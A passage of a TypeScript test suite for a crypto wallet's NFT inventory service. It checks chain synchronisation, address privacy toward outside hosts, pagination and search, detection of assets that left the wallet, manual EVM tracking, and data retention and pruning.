    const r = await lookup('testnet', 'whatever-else'); expect(r.status).toBe(404); expect(r.json).toEqual({ error: 'nft_not_found', message: 'NFT source test-chain: not_found', data: { source: 'test-chain', code: 'not_found', detail: null } });
    expect(JSON.stringify(r.json)).not.toMatch(/SECRETKEY|secret-host/);
    expect((await lookup('solana', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v')).json).toMatchObject({ error: 'nft_unsupported_standard', data: { source: 'solana-rpc', detail: 'fungible_token' } });
    expect((await lookup('cardano', 'addr1qxy')).json.error).toBe('bad_request'); expect((await lookup('cardano', 'addr1qxyaddr1qxyaddr1qxyaddr1qxy')).json).toMatchObject({ error: 'nft_unsupported_chain' }); // a chain without adapter says so
  });
  it('the daily budget of outbound requests is counted and enforced', async () => {
    const [b] = await sql`select requests, bytes from nft_budget where source = 'creator-fetch'`; expect(b.requests).toBeGreaterThan(5); expect(Number(b.bytes)).toBeGreaterThan(1000);
    expect(await store.consumeBudget('probe', now, { requests: 1, bytes: 10 })).toBe(true); expect(await store.consumeBudget('probe', now, { requests: 1, bytes: 10 })).toBe(false);
  });
});

describe('inventory — synchronised from the chains, private, honest about what was not read', () => {
  it('the wallet\'s Solana address (from the server, not from a request) → 63 assets across three sections; EVM: blocked, nothing invented', async () => {
    const first = (await call('GET', '/nfts')).json; expect(first.valuation).toEqual({ state: 'unavailable', reason: 'no_reliable_valuation' });
    await service.sync({ wait: true });
    const l = (await call('GET', '/nfts?limit=100')).json;
    expect(l.total).toBe(63); expect(l.items).toHaveLength(63); expect(l.items.every((x: { inWallet: boolean; chain: string; origin: string }) => x.inWallet && x.chain === 'solana' && x.origin === 'discovered')).toBe(true);
    const caps = (await call('GET', '/nfts/capabilities')).json.chains, solc = caps.find((c: { network: string }) => c.network === 'solana'), eth = caps.find((c: { network: string }) => c.network === 'ethereum');
    expect(solc.sections.map((s: { section: string; status: string; count: number; truncated: boolean }) => [s.section, s.status, s.count, s.truncated])).toEqual([['compressed', 'ok', 9, false], ['core', 'ok', 14, false], ['token', 'ok', 40, true]]);
    expect(eth.inventory).toBe('blocked_by_provider'); expect(eth.sections.map((s: { section: string; status: string }) => [s.section, s.status])).toEqual([['indexer', 'blocked_by_provider'], ['manual', 'ok']]);
    // the requests that carried the wallet's address went to the wallet's own RPC hosts only
    const withAddr = world.asked.filter((c) => JSON.stringify(c.params).includes(SOL_OWNER) || JSON.stringify(c.params).toLowerCase().includes(EVM_OWNER.toLowerCase()));
    expect(new Set(withAddr.map((c) => c.host))).toEqual(new Set(['api.mainnet-beta.solana.com'])); expect(new Set(withAddr.map((c) => c.method))).toEqual(new Set(['getTokenAccountsByOwner', 'getProgramAccounts', 'searchAssets']));
    expect(lookups.every((h) => !h.includes(SOL_OWNER))).toBe(true); expect(dialled.every((d) => !d.url.includes(SOL_OWNER) && !d.url.toLowerCase().includes(EVM_OWNER.toLowerCase()))).toBe(true); // creators' servers never see it
  }, 60_000);
  it('creator metadata is resolved within a per-sync budget; what was not loaded says so', async () => {
    const rows = await sql`select asset->'metadata'->>'status' as s, count(*)::int as n from nft_assets where origin = 'discovered' group by 1`;
    const by = Object.fromEntries(rows.map((r: { s: string; n: number }) => [r.s, r.n])); expect(by.not_loaded).toBe(3); expect((by.unreachable ?? 0) + (by.ok ?? 0) + (by.blocked ?? 0)).toBe(60);
  });
  it('filters, search, sort and cursor pagination', async () => {
    const p1 = (await call('GET', '/nfts?limit=25')).json, p2 = (await call('GET', `/nfts?limit=25&cursor=${p1.cursor}`)).json, p3 = (await call('GET', `/nfts?limit=25&cursor=${p2.cursor}`)).json;
    expect([p1.items.length, p2.items.length, p3.items.length, p3.cursor]).toEqual([25, 25, 13, null]); expect(new Set([...p1.items, ...p2.items, ...p3.items].map((x: { key: string }) => x.key)).size).toBe(63);
    expect((await call('GET', '/nfts?chain=ethereum')).json.total).toBe(0); expect((await call('GET', '/nfts?chain=solana')).json.total).toBe(63);
    const fox = (await call('GET', '/nfts?q=fox%20%233635')).json; expect(fox.items.map((x: { onchainName: string }) => x.onchainName)).toEqual(['Fox #3635']);
    expect((await call('GET', '/nfts?q=GifSyQwxoAJfWF3yfxC6s5654oZUG3gbMAur4yTMs2WG')).json.total).toBe(1); expect((await call('GET', '/nfts?q=%25')).json.total).toBe(0); // wildcards are literal
    const names = (await call('GET', '/nfts?sort=name&limit=100')).json.items.map((x: { onchainName: string | null }) => (x.onchainName ?? '').toLowerCase()).filter(Boolean); expect([...names].sort((x: string, y: string) => (x < y ? -1 : x > y ? 1 : 0))).toEqual(names);
    const cols = (await call('GET', '/nfts/collections')).json.items; expect(cols.length).toBeGreaterThan(1); const top = cols[0];
    expect((await call('GET', `/nfts?collection=${encodeURIComponent(top.collection_key)}`)).json.total).toBe(top.n);
    expect((await call('GET', '/nfts?status=left')).json.total).toBe(0); expect((await call('GET', '/nfts?status=tracked')).json.total).toBe(0);
  });
  it('an NFT that is no longer returned by a COMPLETE section has left the wallet; a truncated section proves nothing', async () => {
    // remove one Core asset and one token account from what the chain answers
    const fx = loadFixture('sol-inventory'), gone = { core: '4AzLGzeisiwYcWGoivNjCKMzKv1UkMF2eZZAcWwWdFHu', token: 'GifSyQwxoAJfWF3yfxC6s5654oZUG3gbMAur4yTMs2WG' };
    for (const c of fx.calls) {
      if (c.method === 'getProgramAccounts') c.result = (c.result as { pubkey: string }[]).filter((x) => x.pubkey !== gone.core);
      if (c.method === 'getTokenAccountsByOwner') (c.result as { value: { account: { data: { parsed: { info: { mint: string } } } } }[] }).value = (c.result as { value: { account: { data: { parsed: { info: { mint: string } } } } }[] }).value.filter((x) => x.account.data.parsed.info.mint !== gone.token);
    }
    // the mint batches change when an account disappears: answer any getMultipleAccounts from the union of recorded accounts
    const all = new Map<string, unknown>(); for (const f of fixtures) for (const c of f.calls) if (c.method === 'getMultipleAccounts' && c.result) (c.params as [string[], { encoding: string }])[0].forEach((addr, k) => all.set(`${c.host}|${(c.params as [string[], { encoding: string }])[1].encoding}|${addr}`, (c.result as { value: unknown[] }).value[k]));
    const base = replay(fx, ...fixtures.filter((f) => f !== fixtures[4]));
    world = { asked: base.asked, rpc: async (url, method, params) => { if (method !== 'getMultipleAccounts') return base.rpc(url, method, params); const [addrs, o] = params as [string[], { encoding: string }], host = new URL(url).host;
      if (!addrs.every((x) => all.has(`${host}|${o.encoding}|${x}`))) throw new Error('unrecorded account'); return { context: { slot: 470480000 }, value: addrs.map((x) => structuredClone(all.get(`${host}|${o.encoding}|${x}`))) }; } };
    tick(TTL + 1000); await service.sync({ wait: true });
    const core = (await item(`sol:solana:${gone.core}`)).json, tok = await sql`select in_wallet, gone_at from nft_assets where key = ${`sol:solana:${gone.token}`}`;
    expect(core.ownership.heldByWallet).toBe(false); expect(core.goneAt).toBeTruthy(); expect(core.quantity).toBe('0');
    expect(tok[0].in_wallet).toBe(true); // the token section is truncated (cap of 40): absence from it is not evidence
    expect((await call('GET', '/nfts?status=left')).json.items.map((x: { key: string }) => x.key)).toEqual([`sol:solana:${gone.core}`]); expect((await call('GET', '/nfts?limit=100')).json.items.filter((x: { inWallet: boolean }) => x.inWallet)).toHaveLength(62);
    world = replay(...fixtures);
  }, 60_000);
  it('a chain source that fails leaves the stored inventory as it was, marked as an error — not as "no NFT"', async () => {
    world = { asked: [], rpc: async () => { throw new Error('fetch failed'); } };
    tick(TTL + 1000); await service.sync({ wait: true });
    expect((await call('GET', '/nfts?limit=100')).json.items.filter((x: { inWallet: boolean }) => x.inWallet)).toHaveLength(62);
    const solc = (await call('GET', '/nfts/capabilities')).json.chains.find((c: { network: string }) => c.network === 'solana'); expect(solc.sections.every((s: { status: string }) => s.status === 'error')).toBe(true);
    const one = (await call('GET', '/nfts?limit=1')).json.items[0]; tick(20 * 60_000);
    const stale = (await item(one.key)).json; expect(stale.ownership.source.freshness).toBe('stale'); expect(stale.key).toBe(one.key); // still answered, flagged possibly stale
    world = replay(...fixtures);
  }, 60_000);
});
const TTL = 5 * 60_000;

describe('manual tracking (EVM: no automatic discovery)', () => {
  const K = 'evm:ethereum:0x0905b2277df5c7dd6c5e3399ece8a36621aebe85/5';
  it('an NFT is added by contract + token id only after the chain confirms it; quantity is the on-chain balance of the wallet', async () => {
    const r = await call('POST', '/nfts/manual', { body: { chain: 'ethereum', address: '0x0905b2277df5c7dd6c5e3399ece8a36621aebe85', tokenId: '5' } }); expect(r.status, JSON.stringify(r.json)).toBe(200);
    expect(r.json).toMatchObject({ key: K, standard: 'erc1155', quantity: '3', origin: 'manual' }); expect(r.json.ownership).toMatchObject({ heldByWallet: true, owner: { state: 'unsupported' } });
    expect((await call('GET', '/nfts?chain=ethereum')).json.items.map((x: { key: string; quantity: string }) => [x.key, x.quantity])).toEqual([[K, '3']]); expect((await call('GET', '/nfts?status=tracked')).json.total).toBe(1);
    expect((await call('GET', '/security/audit?limit=5')).json.events.some((e: { type: string; data: { key: string } }) => e.type === 'nft.tracked' && e.data.key === K)).toBe(true);
  });
  it('something that is not an NFT cannot be tracked; an NFT held by someone else is tracked as "not in this wallet"', async () => {
    expect((await call('POST', '/nfts/manual', { body: { chain: 'ethereum', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', tokenId: '1' } })).json).toMatchObject({ error: 'nft_unsupported_standard' });
    const other = await call('POST', '/nfts/manual', { body: { chain: 'ethereum', address: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', tokenId: '1' } });
    expect(other.json.ownership).toMatchObject({ heldByWallet: false, state: 'not_in_wallet' }); expect(other.json.quantity).toBe('0'); expect((await call('GET', '/nfts?chain=ethereum&status=in_wallet')).json.total).toBe(1);
  });
  it('untracking removes it; the manual list survives a synchronisation', async () => {
    tick(TTL + 1000); await service.sync({ wait: true, chain: 'ethereum' });
    expect((await call('GET', '/nfts?status=tracked')).json.total).toBe(2);
    expect((await call('DELETE', `/nfts/manual?key=${encodeURIComponent('evm:ethereum:0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d/1')}`)).json).toEqual({ ok: true, removed: true });
    expect((await call('GET', '/nfts?status=tracked')).json.items.map((x: { key: string }) => x.key)).toEqual([K]);
  }, 60_000);
  it('receive: the wallet\'s own addresses per readable chain, with the warnings that apply — Bitcoin carries the Ordinals warning', async () => {
    const r = (await call('GET', '/nfts/receive')).json.items, by = Object.fromEntries(r.map((x: { network: string }) => [x.network, x]));
    expect(by.solana).toMatchObject({ address: SOL_OWNER, warnings: ['sol_compressed_needs_indexer', 'arrival_after_confirmation'] }); expect(by.ethereum).toMatchObject({ address: EVM_OWNER, warnings: ['evm_same_address_check_network', 'evm_arrival_known_contracts_only', 'arrival_after_confirmation'], detection: 'blocked_by_provider' });
    expect(by.bitcoin).toMatchObject({ address: addresses.bitcoin, warnings: ['ordinals_heuristic_only', 'ordinals_no_transfer', 'arrival_after_confirmation'] }); expect(by.cardano).toBeUndefined();
  });
});

describe('retention — everything that grows is pruned', () => {
  it('old lookups, NFTs that left long ago, orphan events, expired metadata, idle media and old budgets go; the inventory stays', async () => {
    const before = { assets: (await sql`select count(*)::int as n from nft_assets`)[0].n, inWallet: (await sql`select count(*)::int as n from nft_assets where in_wallet`)[0].n };
    const r0 = await service.prune(); expect(r0.assets).toBe(0); // nothing is old yet
    tick(8 * 86_400_000); // 8 days: lookups (7 days) expire; "left" (30 days) not yet
    const r1 = await service.prune();
    expect(r1.assets).toBeGreaterThanOrEqual(8); expect((await sql`select count(*)::int as n from nft_assets where origin = 'lookup'`)[0].n).toBe(0);
    expect(r1.events).toBe(8); expect((await sql`select count(*)::int as n from nft_events`)[0].n).toBe(0); expect((await sql`select count(*)::int as n from nft_event_scan`)[0].n).toBe(0);
    expect((await sql`select count(*)::int as n from nft_assets where not in_wallet and origin = 'discovered'`)[0].n).toBe(1);
    tick(40 * 86_400_000);
    const r2 = await service.prune();
    expect(r2.assets).toBe(1); expect(r2.metadata).toBeGreaterThan(0); expect(r2.media.length).toBeGreaterThan(0); expect(r2.budgets).toBeGreaterThan(0);
    expect((await sql`select count(*)::int as n from nft_assets where in_wallet`)[0].n).toBe(before.inWallet); expect((await sql`select count(*)::int as n from nft_metadata`)[0].n).toBe(0); expect((await sql`select count(*)::int as n from nft_media`)[0].n).toBe(0);
    expect(readdirSync(cacheDir)).toEqual([]); // the cached files went with their rows
    expect((await sql`select count(*)::int as n from nft_manual`)[0].n).toBe(1); // the owner's list is not a cache
  });
  it('the media cache has a size cap: least recently used files are dropped first', async () => {
    const t = new Date(now);
    for (const [id, bytes, at] of [['a', 600, 3], ['b', 600, 2], ['c', 600, 1]] as const) await sql`insert into nft_media (id, source_uri, status, mime, kind, bytes, fetched_at, last_access, expires_at) values (${`m${id.repeat(40)}`}, ${`https://x.example/${id}`}, 'available', 'image/png', 'image', ${bytes}, ${t}, ${new Date(t.getTime() - at * 1000)}, ${new Date(t.getTime() + 1e9)})`;
    expect(await store.mediaOverCap(1300)).toEqual([`m${'a'.repeat(40)}`]); expect((await sql`select status from nft_media where id = ${`m${'a'.repeat(40)}`}`)[0].status).toBe('not_fetched');
  });
  it('the schema is additive and idempotent', async () => { const db = await import('../src/db.ts'); await db.migrate(); await db.migrate(); expect((await sql`select count(*)::int as n from information_schema.tables where table_name like 'nft\_%'`)[0].n).toBe(10); // delivery 2: + nft_arrival_scan
    expect((await sql`select count(*)::int as n from information_schema.columns where table_name = 'proposals' and column_name = 'nft'`)[0].n).toBe(1); expect((await sql`select count(*)::int as n from information_schema.tables where table_name = 'utxo_reviews'`)[0].n).toBe(1); });
});
